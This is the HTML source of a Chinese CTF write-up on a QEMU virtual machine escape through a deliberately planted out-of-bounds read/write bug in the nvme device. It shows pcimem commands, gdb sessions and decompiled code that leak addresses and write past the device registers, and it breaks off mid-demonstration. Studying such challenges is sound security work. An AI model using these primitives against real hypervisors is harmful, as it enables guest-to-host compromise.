@@ -1,0 +1,883 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,ctf,vmescape,qemu,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="题目描述分发附件：Vmware虚拟机镜像文件题目描述：该题以qemu虚拟机软件的某CVE漏洞为参考，在qemu某模块中置入存在漏洞的代码，导致一些不可预测的执行流程，从而完成虚拟机逃逸攻击。选手需要在运行在qemu虚拟机中的ubuntu操作系统下进行逃逸操作，尝试触发漏洞并在宿主机(Deepin Linux)中执行任意代码。展示区网络拓扑：一台交换机连接选手攻击机和靶机。展示过程及要求：选手携带自">
+<meta name="keywords" content="pwn,ctf,vmescape,qemu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="qwb final execchrome writeup">
+<meta property="og:url" content="http://yoursite.com/2019/07/04/qwb-final-execchrome-writeup/index.html">
+<meta property="og:site_name" content="greyd0g&#39; blog">
+<meta property="og:description" content="题目描述分发附件：Vmware虚拟机镜像文件题目描述：该题以qemu虚拟机软件的某CVE漏洞为参考，在qemu某模块中置入存在漏洞的代码，导致一些不可预测的执行流程，从而完成虚拟机逃逸攻击。选手需要在运行在qemu虚拟机中的ubuntu操作系统下进行逃逸操作，尝试触发漏洞并在宿主机(Deepin Linux)中执行任意代码。展示区网络拓扑：一台交换机连接选手攻击机和靶机。展示过程及要求：选手携带自">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/07/04/5d1d71240a41928715.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/04/5d1d70e830c8585405.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/04/5d1d70a1e141325559.jpg">
+<meta property="og:updated_time" content="2019-07-05T09:39:14.810Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="qwb final execchrome writeup">
+<meta name="twitter:description" content="题目描述分发附件：Vmware虚拟机镜像文件题目描述：该题以qemu虚拟机软件的某CVE漏洞为参考，在qemu某模块中置入存在漏洞的代码，导致一些不可预测的执行流程，从而完成虚拟机逃逸攻击。选手需要在运行在qemu虚拟机中的ubuntu操作系统下进行逃逸操作，尝试触发漏洞并在宿主机(Deepin Linux)中执行任意代码。展示区网络拓扑：一台交换机连接选手攻击机和靶机。展示过程及要求：选手携带自">
+<meta name="twitter:image" content="https://i.loli.net/2019/07/04/5d1d71240a41928715.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/04/qwb-final-execchrome-writeup/">
+
+
+
+
+
+  <title>qwb final execchrome writeup | greyd0g' blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">greyd0g' blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">good good study</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            友情链接
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/04/qwb-final-execchrome-writeup/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="greyd0g">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="greyd0g' blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">qwb final execchrome writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-04T02:41:20+08:00">
+                2019-07-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/07/04/qwb-final-execchrome-writeup/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2019/07/04/qwb-final-execchrome-writeup/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><strong>分发附件：</strong>Vmware虚拟机镜像文件<br><strong>题目描述：</strong>该题以qemu虚拟机软件的某CVE漏洞为参考，在qemu某模块中置入存在漏洞的代码，导致一些不可预测的执行流程，从而完成虚拟机逃逸攻击。选手需要在运行在qemu虚拟机中的ubuntu操作系统下进行逃逸操作，尝试触发漏洞并在宿主机(Deepin Linux)中执行任意代码。<br><strong>展示区网络拓扑：</strong>一台交换机连接选手攻击机和靶机。<br><strong>展示过程及要求：</strong>选手携带自己的攻击机上台，通过网线接入交换机。靶机中运行了宿主机Deepin Linux系统，系统内又嵌套运行了qemu下的Ubuntu系统。Ubuntu系统的22端口被映射到宿主机的2222端口。选手使用ssh连接宿主机的2222端口，用户名：ubuntu,密码：123456。选手在Ubuntu系统中执行漏洞利用代码，在规定时间内在宿主机中执行“google-chrome –no-sandbox file:///home/qwb/Desktop/success.mp4”命令，宿主机中弹出chrome浏览器，并显示成功动画即为展示成功。<br>宿主机运行bash脚本监控并自动重启qemu。如果qemu软件崩溃会自动重启，请选手耐心等待直到客户机ssh连接恢复。如果qemu软件无法重启，选手可要求将虚拟机恢复到初始状态，恢复快照时不停止计时。<br><strong>开始计时时间：</strong>选手第一次成功登陆ubuntu客户机时，开始计时。</p>
+<ul>
+<li><p>launch.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line">	<span class="keyword">do</span> ./qemu-system-x86_64 -m 1024 -smp 2 -boot c -cpu host -hda ubuntu_server.qcow2 --<span class="built_in">enable</span>-kvm -drive file=./blknvme,<span class="keyword">if</span>=none,id=D22 -device nvme,drive=D22,serial=1234 -net user,hostfwd=tcp::2222-:22 -net nic &amp;&amp; sleep 5</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>qemu-system-x86_64 信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">qwb@ExecChrome:~/Desktop/QWB$ ./qemu-system-x86_64  --version</span><br><span class="line">QEMU emulator version 4.0.50 (v4.0.0-1043-ge2a58ff493-dirty)</span><br><span class="line">Copyright (c) 2003-2019 Fabrice Bellard and the QEMU Project developers</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><strong>比赛时：</strong></p>
+<p>​        由于是第一次上手qemu，缺乏相关知识积累。第一件事就是从github下载了qemu的源码，载所给的虚机中编译了一遍。在编译的过程中查找了以往ctf中出现的qemu虚拟机逃逸的相关wp。通过wp，了解到一般漏洞设置载加载的<em>虚拟设备</em>中，与虚拟设备的交互一般通过<em>mmio</em>或着<em>portio</em> 。而利用代码的编写一般有两种形式，一种通过编写内核驱动与设备交互，一种通过在将设备空间映射到用户内存空间进行交互。</p>
+<p>​        在看完几篇wp后，虚拟机中的qemu已编译完成。用ida 打开两个编译的qemu和题目所提供的qemu。在加载过程中，想利现成工具进行diff，看到加载过程十分慢（linux wine 的ida放弃折腾）。就放弃了这种做法。经过肉眼对比，发现大部分函数反编译后基本一致。题目环境加载了nvme设备，直接搜索nvme相关函数，重点对比了write和read函数，可以发现nvme_mmio_read和nvme_mmio_write两个文件存在着代码改动。两处的代码改动都减少了一个条件判断，看到这里基本确定载读写过程中存在着问题，可能存在着越界读写。由于在题干中提到以某cve为参考，于是搜寻了一番相关cve。在repo中搜索，发现了cve-2018-16847。</p>
+<p>于是开始了poc搜寻之路，一搜索未果。</p>
+<p>​        接着，开始尝试触发漏洞代码，验证之前的设想。参照网上的相关wp，发现套用别人代码无法完成所需要的相关工作。对nvme设备相关的知识又十分匮乏，于是又展开了大胆的想象。第一次尝试使用已加载的nvme驱动间接与nvme设备进行交互。将nvme.ko拷贝出，拖进ida。看了半天，没有找到相关测试样例，放弃。第二次尝试使用nvme_cli来进行交互，发现到达nvme设备相关函数，但是不会到达指定路径。</p>
+<p>​        完成以上工作后，就陷入了死胡同。接下来的一天多时间就开始四处查找资料（划水）。</p>
+<ul>
+<li>nvme_mmio_read</li>
+</ul>
+<p><img src="https://i.loli.net/2019/07/04/5d1d71240a41928715.png" alt="nvme_mmio_read.png"></p>
+<ul>
+<li>nvme_mmio_write</li>
+</ul>
+<p><img src="https://i.loli.net/2019/07/04/5d1d70e830c8585405.png" alt="nvme_mmio_write.png"></p>
+<p><strong>比赛后：</strong></p>
+<p>​        两天时间放在这一题，毫无进展，感觉十分挫败。赛后咨询大佬，了解到漏洞代码位置确实是在上图所示的位置，最后劫持rip使用timer。</p>
+<p>​        于是又开始了搜索的道路，这时才知道github上有个叫pcimem的项目，项目代码经过封装后就可以直接在用户空间读写pci设备。在w0lfzhang师傅的vmescap中，可以看到他封装的函数。这里可以直接拿过来用。</p>
+<p><strong>从头看题:</strong></p>
+<p>​        通过lspci -vv 可以查看pci设备的详细信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00:04.0 Non-Volatile memory controller: Intel Corporation QEMU NVM Express Controller (rev 02) (prog-if 02 [NVM Express])</span><br><span class="line">	Subsystem: Red Hat, Inc. QEMU Virtual Machine</span><br><span class="line">	Physical Slot: 4</span><br><span class="line">	Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx+</span><br><span class="line">	Status: Cap+ 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx-</span><br><span class="line">	Latency: 0</span><br><span class="line">	Interrupt: pin A routed to IRQ 10</span><br><span class="line">	Region 0: Memory at febf0000 (64-bit, non-prefetchable) [size=8K]</span><br><span class="line">	Region 4: Memory at febf3000 (32-bit, non-prefetchable) [size=4K]</span><br><span class="line">	Capabilities: [40] MSI-X: Enable+ Count=64 Masked-</span><br><span class="line">		Vector table: BAR=4 offset=00000000</span><br><span class="line">		PBA: BAR=4 offset=00000800</span><br><span class="line">	Capabilities: [80] Express (v2) Endpoint, MSI 00</span><br><span class="line">		DevCap:	MaxPayload 128 bytes, PhantFunc 0, Latency L0s &lt;64ns, L1 &lt;1us</span><br><span class="line">			ExtTag- AttnBtn- AttnInd- PwrInd- RBE+ FLReset-</span><br><span class="line">		DevCtl:	Report errors: Correctable- Non-Fatal- Fatal- Unsupported-</span><br><span class="line">			RlxdOrd- ExtTag- PhantFunc- AuxPwr- NoSnoop-</span><br><span class="line">			MaxPayload 128 bytes, MaxReadReq 128 bytes</span><br><span class="line">		DevSta:	CorrErr- UncorrErr- FatalErr- UnsuppReq- AuxPwr- TransPend-</span><br><span class="line">		LnkCap:	Port <span class="comment">#0, Speed 2.5GT/s, Width x1, ASPM L0s, Exit Latency L0s &lt;64ns, L1 &lt;1us</span></span><br><span class="line">			ClockPM- Surprise- LLActRep- BwNot- ASPMOptComp-</span><br><span class="line">		LnkCtl:	ASPM Disabled; RCB 64 bytes Disabled- CommClk-</span><br><span class="line">			ExtSynch- ClockPM- AutWidDis- BWInt- AutBWInt-</span><br><span class="line">		LnkSta:	Speed 2.5GT/s, Width x1, TrErr- Train- SlotClk- DLActive+ BWMgmt- ABWMgmt-</span><br><span class="line">		DevCap2: Completion Timeout: Not Supported, TimeoutDis-, LTR-, OBFF Not Supported</span><br><span class="line">		DevCtl2: Completion Timeout: 50us to 50ms, TimeoutDis-, LTR-, OBFF Disabled</span><br><span class="line">		LnkSta2: Current De-emphasis Level: -6dB, EqualizationComplete-, EqualizationPhase1-</span><br><span class="line">			 EqualizationPhase2-, EqualizationPhase3-, LinkEqualizationRequest-</span><br><span class="line">	Kernel driver <span class="keyword">in</span> use: nvme</span><br><span class="line">	Kernel modules: nvme</span><br></pre></td></tr></table></figure>
+<p>​        查看设备相关的文件。其中resource0 对应着region 0，resource对应着region 4 . resource 是资源空间，对应着 PCI 设备的可映射内存空间。从”PCI 配置空间”解析出来的资源定义段落分别生成的，它们是 PCI 总线驱动在 PCI 设备初始化阶段加上去的，都是二进制属性，但没有实现读写接口，只支持 mmap 内存映射接口。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@ExecChrome:/home/ubuntu<span class="comment"># ls -al /sys/devices/pci0000\:00/0000\:00\:04.0/</span></span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  5 root root    0 Jul  4 08:17 .</span><br><span class="line">drwxr-xr-x 12 root root    0 Jul  4  2019 ..</span><br><span class="line">-rw-r--r--  1 root root 4096 Jul  4 08:17 broken_parity_status</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4  2019 class</span><br><span class="line">-rw-r--r--  1 root root  256 Jul  4  2019 config</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4 08:17 consistent_dma_mask_bits</span><br><span class="line">-rw-r--r--  1 root root 4096 Jul  4 08:17 d3cold_allowed</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4  2019 device</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4 08:17 dma_mask_bits</span><br><span class="line">lrwxrwxrwx  1 root root    0 Jul  4  2019 driver -&gt; ../../../bus/pci/drivers/nvme</span><br><span class="line">-rw-r--r--  1 root root 4096 Jul  4 08:17 driver_override</span><br><span class="line">-rw-r--r--  1 root root 4096 Jul  4 08:17 <span class="built_in">enable</span></span><br><span class="line">lrwxrwxrwx  1 root root    0 Jul  4 08:17 firmware_node -&gt; ../../LNXSYSTM:00/LNXSYBUS:00/PNP0A03:00/device:06</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4  2019 irq</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4 08:17 local_cpulist</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4  2019 local_cpus</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4  2019 modalias</span><br><span class="line">-rw-r--r--  1 root root 4096 Jul  4 08:17 msi_bus</span><br><span class="line">drwxr-xr-x  2 root root    0 Jul  4  2019 msi_irqs</span><br><span class="line">-rw-r--r--  1 root root 4096 Jul  4  2019 numa_node</span><br><span class="line">drwxr-xr-x  3 root root    0 Jul  4  2019 nvme</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4 08:17 pools</span><br><span class="line">drwxr-xr-x  2 root root    0 Jul  4 08:17 power</span><br><span class="line">--w--w----  1 root root 4096 Jul  4 08:17 remove</span><br><span class="line">--w--w----  1 root root 4096 Jul  4 08:17 rescan</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4  2019 resource</span><br><span class="line">-rw-------  1 root root 8192 Jul  4 08:17 resource0</span><br><span class="line">-rw-------  1 root root 4096 Jul  4 08:17 resource4</span><br><span class="line">lrwxrwxrwx  1 root root    0 Jul  4  2019 subsystem -&gt; ../../../bus/pci</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4  2019 subsystem_device</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4  2019 subsystem_vendor</span><br><span class="line">-rw-r--r--  1 root root 4096 Jul  4  2019 uevent</span><br><span class="line">-r--r--r--  1 root root 4096 Jul  4  2019 vendor</span><br></pre></td></tr></table></figure>
+<p>​    通过pcimem读写resource0空间进行调试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">root@ExecChrome:/home/ubuntu<span class="comment">#  ./pcimem /sys/devices/pci0000\:00/0000\:00\:04.0/resource0 0x100 d</span></span><br><span class="line">/sys/devices/pci0000:00/0000:00:04.0/resource0 opened.</span><br><span class="line">Target offset is 0x100, page size is 4096</span><br><span class="line">mmap(0, 4096, 0x3, 0x1, 3, 0x100)</span><br><span class="line">PCI Memory mapped to address 0x7f1f8f5a4000.</span><br><span class="line">0x0100: 0x00007F6ED4279530</span><br><span class="line">载gdb中设置条件断点</span><br><span class="line"><span class="built_in">break</span> nvme_mmio_read <span class="keyword">if</span> <span class="variable">$rsi</span>==0x100</span><br><span class="line">Thread 4 <span class="string">"qemu-system-x86"</span> hit Breakpoint 5, nvme_mmio_read (opaque=0x557463fc33d0, addr=0x100, size=0x4) at /home/ctflag/tools/qemu/hw/block/nvme.c:1066</span><br><span class="line">1066	<span class="keyword">in</span> /home/ctflag/tools/qemu/hw/block/nvme.c</span><br><span class="line"></span><br><span class="line">gdb-peda$ p n</span><br><span class="line"><span class="variable">$3</span> = (NvmeCtrl *) 0x557463fc33d0</span><br><span class="line">gdb-peda$ p ptr</span><br><span class="line"><span class="variable">$4</span> = (uint8_t *) 0x557463fc3e90 <span class="string">"\377\a\003\017 "</span></span><br><span class="line">gdb-peda$ p <span class="variable">$3</span>-&gt;bar</span><br><span class="line"><span class="variable">$5</span> = &#123;</span><br><span class="line">  <span class="built_in">cap</span> = 0x4000200f0307ff, </span><br><span class="line">  vs = 0x10200, </span><br><span class="line">  intms = 0x0, </span><br><span class="line">  intmc = 0x0, </span><br><span class="line">  cc = 0x460001, </span><br><span class="line">  rsvd1 = 0x0, </span><br><span class="line">  csts = 0x1, </span><br><span class="line">  nssrc = 0x0, </span><br><span class="line">  aqa = 0xff00ff, </span><br><span class="line">  asq = 0x356c4000, </span><br><span class="line">  acq = 0x34c74000, </span><br><span class="line">  cmbloc = 0x0, </span><br><span class="line">  cmbsz = 0x0</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ p &amp;<span class="variable">$3</span>-&gt;bar</span><br><span class="line"><span class="variable">$6</span> = (NvmeBar *) 0x557463fc3e90</span><br><span class="line">gdb-peda$ x /gx 0x557463fc3e90+0x100</span><br><span class="line">0x557463fc3f90:	0x00007f6ed4279530</span><br><span class="line">gdb-peda$ </span><br><span class="line">nvme_mmio_read可以读取通过 n-&gt;bar的地址加上addr地址空间的数据。n的数据结构为NvmeCtrl，存放在堆空间。</span><br><span class="line">其中存在代码段地址和堆空间地址，可以完成leak。</span><br><span class="line">gdb-peda$ ptype NvmeCtrl</span><br><span class="line"><span class="built_in">type</span> = struct NvmeCtrl &#123;</span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line">    MemoryRegion iomem;</span><br><span class="line">    MemoryRegion ctrl_mem;</span><br><span class="line">    NvmeBar bar;</span><br><span class="line">    BlockConf conf;</span><br><span class="line">    uint32_t page_size;</span><br><span class="line">    uint16_t page_bits;</span><br><span class="line">    uint16_t max_prp_ents;</span><br><span class="line">    uint16_t cqe_size;</span><br><span class="line">    uint16_t sqe_size;</span><br><span class="line">    uint32_t reg_size;</span><br><span class="line">    uint32_t num_namespaces;</span><br><span class="line">    uint32_t num_queues;</span><br><span class="line">    uint32_t max_q_ents;</span><br><span class="line">    uint64_t ns_size;</span><br><span class="line">    uint32_t cmb_size_mb;</span><br><span class="line">    uint32_t cmbsz;</span><br><span class="line">    uint32_t cmbloc;</span><br><span class="line">    uint8_t *cmbuf;</span><br><span class="line">    uint64_t irq_status;</span><br><span class="line">    char *serial;</span><br><span class="line">    NvmeNamespace *namespaces;</span><br><span class="line">    NvmeSQueue **sq;</span><br><span class="line">    NvmeCQueue **cq;</span><br><span class="line">    NvmeSQueue admin_sq;</span><br><span class="line">    NvmeCQueue admin_cq;</span><br><span class="line">    NvmeIdCtrl id_ctrl;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">在调用nvme_mmio_write时当addr&lt;=0xfff时会进入 nvme_write_bar(opaque, addr, data, size);在nvme_write_bar的最后出题人添加了一段代码，给了我们能够往n-&gt;bar地址后0x1000空间的任意写。</span><br><span class="line">......</span><br><span class="line">    &#123;</span><br><span class="line">        *(&amp;n-&gt;bar.cap + offset) = dataa;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( sizea &gt; 2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sizea == 4 )</span><br><span class="line">        &#123;</span><br><span class="line">          *(&amp;n-&gt;bar.cap + offset) = dataa;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( sizea == 8 )</span><br><span class="line">        &#123;</span><br><span class="line">          *(&amp;n-&gt;bar.cap + offset) = dataa;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( sizea == 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;n-&gt;bar.cap + offset) = dataa;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root@ExecChrome:/home/ubuntu<span class="comment"># ./pcimem /sys/devices/pci0000\:00/0000\:00\:04.0/resource0 0x100 d   0x12345678deadbeef</span></span><br><span class="line">往0x100的偏移地址写入0x12345678deadbeef</span><br><span class="line"></span><br><span class="line">断点被命两次，两次分别写入四字节。</span><br><span class="line"></span><br><span class="line">hread 3 <span class="string">"qemu-system-x86"</span> hit Breakpoint 2, nvme_mmio_write (opaque=0x557463fc33d0, addr=0x100, data=0xdeadbeef, size=0x4) at /home/ctflag/tools/qemu/hw/block/nvme.c:1171</span><br><span class="line">1171	<span 